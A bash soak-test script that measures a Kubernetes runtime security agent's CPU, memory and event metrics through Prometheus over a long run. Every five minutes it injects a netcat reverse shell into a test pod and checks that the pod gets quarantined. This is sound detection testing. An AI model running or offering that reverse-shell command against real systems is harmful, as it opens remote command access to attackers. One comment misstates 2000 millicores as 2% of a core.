#!/usr/bin/env bash
# ==============================================================================
# ZTRE Soak Test: Endurance Run (default 1 hour)
# Validates M5 stability (CPU/RAM) under continuous legitimate workload with
# periodic attack injection. Metrics are sourced from Prometheus, which scrapes
# the ZTRE agent; the bastion cannot reach pod IPs directly and the agent image
# is distroless (no shell), so all observation is done through the Prometheus API.
#
# Usage: soak_test.sh [duration_seconds]   (default 3600)
# ==============================================================================
set -euo pipefail

DURATION=${1:-3600}          # Default 1 hour
SAMPLE_INTERVAL=60           # Sample every 60s
ATTACK_INTERVAL=300          # Inject attack every 5 min
OUTPUT_DIR="evidence/soak"
METRICS_CSV="$OUTPUT_DIR/metrics.csv"
PF_PORT=9091

COLOR_GREEN="\033[0;32m"
COLOR_BLUE="\033[0;34m"
COLOR_YELLOW="\033[0;33m"
COLOR_RED="\033[0;31m"
COLOR_RESET="\033[0m"
log_info()  { echo -e "${COLOR_BLUE}[INFO]${COLOR_RESET} $(date -Iseconds) $*"; }
log_warn()  { echo -e "${COLOR_YELLOW}[WARN]${COLOR_RESET} $(date -Iseconds) $*"; }
log_pass()  { echo -e "${COLOR_GREEN}[PASS]${COLOR_RESET} $(date -Iseconds) $*"; }
log_fail()  { echo -e "${COLOR_RED}[FAIL]${COLOR_RESET} $(date -Iseconds) $*"; }

mkdir -p "$OUTPUT_DIR"

echo "======================================================================"
echo "    ZTRE Soak Test: ${DURATION}s Endurance Run                        "
echo "======================================================================"

# --- Start Prometheus port-forward (metrics source) -------------------------
pkill -f "port-forward.*prometheus" 2>/dev/null || true
sleep 1
kubectl port-forward -n monitoring svc/prometheus ${PF_PORT}:9090 --address 127.0.0.1 \
    >/tmp/soak-prom-pf.log 2>&1 &
PF_PID=$!
sleep 4

if ! curl -sf "http://127.0.0.1:${PF_PORT}/api/v1/query?query=up" >/dev/null 2>&1; then
    log_fail "Prometheus not reachable on 127.0.0.1:${PF_PORT}. Deploy monitoring first:"
    echo "        bash deploy/grafana/deploy-monitoring.sh"
    kill $PF_PID 2>/dev/null || true
    exit 1
fi
log_pass "Prometheus metrics source ready"

# helper: instantaneous query value
promval() {
    local expr="$1"
    local enc
    enc=$(python3 -c "import urllib.parse,sys; print(urllib.parse.quote(sys.argv[1]))" "$expr")
    curl -sf "http://127.0.0.1:${PF_PORT}/api/v1/query?query=${enc}" 2>/dev/null \
      | python3 -c "
import json,sys
try:
    d=json.load(sys.stdin)
    r=d['data']['result']
    print(r[0]['value'][1] if r else '0')
except Exception:
    print('0')
"
}

# --- Ensure test workload target -------------------------------------------
AGENT_POD=$(kubectl get pods -n ztre-system -l app.kubernetes.io/name=ztre-agent \
  --field-selector=status.phase=Running -o jsonpath='{.items[0].metadata.name}')
log_info "ZTRE Agent pod: $AGENT_POD"

log_info "Ensuring test workloads are deployed..."
kubectl apply -f deploy/workloads/ >/dev/null 2>&1 || true
kubectl rollout status deployment/vulnerable-app -n ztre-test --timeout=90s >/dev/null 2>&1 || true

VULN_POD=$(kubectl get pod -n ztre-test -l app=vulnerable-app -o jsonpath='{.items[0].metadata.name}')
log_info "Attack target: $VULN_POD"

# ---- Continuous legitimate workload generator ------------------------------
log_info "Starting continuous legitimate workload generator..."
kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true
kubectl run legit-soak -n ztre-test --image=alpine --restart=Always -- \
    /bin/sh -c 'while true; do ls /tmp >/dev/null 2>&1; sleep 1; done' >/dev/null 2>&1
kubectl wait --for=condition=Ready pod/legit-soak -n ztre-test --timeout=60s >/dev/null 2>&1 || true

# --- CSV header -------------------------------------------------------------
echo "timestamp,cpu_millicores,memory_mi,goroutines,events_ingested,events_dropped,containments,api_errors,alerts" > "$METRICS_CSV"

START=$(date +%s)
LAST_ATTACK=0
SAMPLE_COUNT=0
ATTACK_COUNT=0

log_info "Beginning soak test (duration=${DURATION}s, sample=${SAMPLE_INTERVAL}s, attack=${ATTACK_INTERVAL}s)..."
echo ""

while true; do
    ELAPSED=$(($(date +%s) - START))
    [ "$ELAPSED" -ge "$DURATION" ] && break

    # --- Sample metrics from Prometheus ---
    GOROUTINES=$(promval 'go_goroutines{job="ztre-agent"}')
    INGESTED=$(promval 'sum(ztre_events_ingested_total)')
    DROPPED=$(promval 'sum(ztre_events_dropped_total)')
    CONTAINMENTS=$(promval 'sum(ztre_containment_actions_total)')
    API_ERRORS=$(promval 'sum(ztre_api_errors_total)')
    ALERTS=$(promval 'sum(ztre_decision_alerts_dispatched_total)')

    # CPU (millicores) and memory (MiB) from cAdvisor
    CPU_RAW=$(promval 'sum(rate(container_cpu_usage_seconds_total{container="ztre-agent"}[1m]))')
    MEM_RAW=$(promval 'sum(container_memory_rss{container="ztre-agent"})')
    CPU=$(awk "BEGIN {printf \"%.1f\", ${CPU_RAW:-0} * 1000}")
    MEM=$(awk "BEGIN {printf \"%.1f\", ${MEM_RAW:-0} / 1048576}")

    # Format counters as integers
    INGESTED=$(awk "BEGIN {printf \"%.0f\", ${INGESTED:-0}}")
    DROPPED=$(awk "BEGIN {printf \"%.0f\", ${DROPPED:-0}}")
    CONTAINMENTS=$(awk "BEGIN {printf \"%.0f\", ${CONTAINMENTS:-0}}")
    API_ERRORS=$(awk "BEGIN {printf \"%.0f\", ${API_ERRORS:-0}}")
    ALERTS=$(awk "BEGIN {printf \"%.0f\", ${ALERTS:-0}}")
    GOROUTINES=$(awk "BEGIN {printf \"%.0f\", ${GOROUTINES:-0}}")

    TIMESTAMP=$(date -Iseconds)
    echo "${TIMESTAMP},${CPU},${MEM},${GOROUTINES},${INGESTED},${DROPPED},${CONTAINMENTS},${API_ERRORS},${ALERTS}" >> "$METRICS_CSV"
    SAMPLE_COUNT=$((SAMPLE_COUNT + 1))

    log_info "[${ELAPSED}/${DURATION}s] CPU=${CPU}m MEM=${MEM}Mi goroutines=${GOROUTINES} ingested=${INGESTED} dropped=${DROPPED} containments=${CONTAINMENTS}"

    # --- Periodic attack injection ---
    SINCE_ATTACK=$((ELAPSED - LAST_ATTACK))
    if [ "$SINCE_ATTACK" -ge "$ATTACK_INTERVAL" ] && [ "$ELAPSED" -gt 0 ]; then
        ATTACK_COUNT=$((ATTACK_COUNT + 1))
        log_warn "Injecting attack #${ATTACK_COUNT} (reverse shell on vulnerable-app)..."

        # Clear prior quarantine so the pod can be re-targeted
        kubectl label pod "$VULN_POD" -n ztre-test ztre/quarantine- --overwrite >/dev/null 2>&1 || true
        sleep 2

        kubectl exec -n ztre-test "$VULN_POD" -- /bin/sh -c 'nc -e /bin/sh 10.91.128.10 4444' >/dev/null 2>&1 || true
        LAST_ATTACK=$ELAPSED
        sleep 4

        Q_LABEL=$(kubectl get pod "$VULN_POD" -n ztre-test -o jsonpath='{.metadata.labels.ztre/quarantine}' 2>/dev/null || true)
        if [ "$Q_LABEL" = "true" ]; then
            log_pass "Attack #${ATTACK_COUNT} detected and contained"
        else
            log_fail "Attack #${ATTACK_COUNT} NOT contained!"
        fi
    fi

    sleep "$SAMPLE_INTERVAL"
done

# --- Cleanup -----------------------------------------------------------------
kubectl delete pod legit-soak -n ztre-test --ignore-not-found=true >/dev/null 2>&1 || true

# --- Analysis ----------------------------------------------------------------
echo ""
echo "======================================================================"
echo "    Soak Test Results                                                  "
echo "======================================================================"

DATA=$(tail -n +2 "$METRICS_CSV")
PEAK_CPU=$(echo "$DATA" | awk -F',' '{print $2}' | sort -n | tail -1)
PEAK_MEM=$(echo "$DATA" | awk -F',' '{print $3}' | sort -n | tail -1)
AVG_CPU=$(echo "$DATA" | awk -F',' '{sum+=$2; n++} END {printf "%.1f", sum/n}')
AVG_MEM=$(echo "$DATA" | awk -F',' '{sum+=$3; n++} END {printf "%.1f", sum/n}')
FIRST_GO=$(echo "$DATA" | head -1 | awk -F',' '{print $4}')
LAST_GO=$(echo "$DATA" | tail -1 | awk -F',' '{print $4}')
TOTAL_DROPPED=$(echo "$DATA" | tail -1 | awk -F',' '{print $6}')
TOTAL_CONTAIN=$(echo "$DATA" | tail -1 | awk -F',' '{print $7}')

echo "  Duration:            ${DURATION}s ($(( DURATION / 60 )) min)"
echo "  Samples collected:   ${SAMPLE_COUNT}"
echo "  Attacks injected:    ${ATTACK_COUNT}"
echo ""
echo "  CPU    (avg/peak):   ${AVG_CPU}m / ${PEAK_CPU}m    (PRD M5 limit: <= 2000m = 2% of 1 core)"
echo "  Memory (avg/peak):   ${AVG_MEM}Mi / ${PEAK_MEM}Mi  (PRD M5 limit: <= 128Mi)"
echo "  Goroutines (start/end): ${FIRST_GO} / ${LAST_GO}"
echo "  Events dropped:      ${TOTAL_DROPPED}"
echo "  Total containments:  ${TOTAL_CONTAIN}"
echo ""
echo "  CSV output:          ${METRICS_CSV}"
echo ""

PEAK_MEM_I=$(awk "BEGIN {printf \"%d\", ${PEAK_MEM:-0}}")
if [ "${PEAK_MEM_I:-0}" -le 128 ]; then
    log_pass "Memory within PRD limit (peak ${PEAK_MEM}Mi <= 128Mi)"
else
    log_fail "Memory exceeded PRD limit (peak ${PEAK_MEM}Mi > 128Mi)"
fi

if [ "${TOTAL_DROPPED:-0}" -eq 0 ]; then
    log_pass "Zero event drops during soak"
else
    log_warn "${TOTAL_DROPPED} events dropped during soak"
fi

GO_DELTA=$(awk "BEGIN {printf \"%d\", ${LAST_GO:-0} - ${FIRST_GO:-0}}")
if [ "${GO_DELTA:-0}" -le 5 ]; then
    log_pass "No goroutine leak detected (delta: ${GO_DELTA})"
else
    log_fail "Possible goroutine leak (delta: ${GO_DELTA})"
fi

kill $PF_PID 2>/dev/null || true
echo "======================================================================"
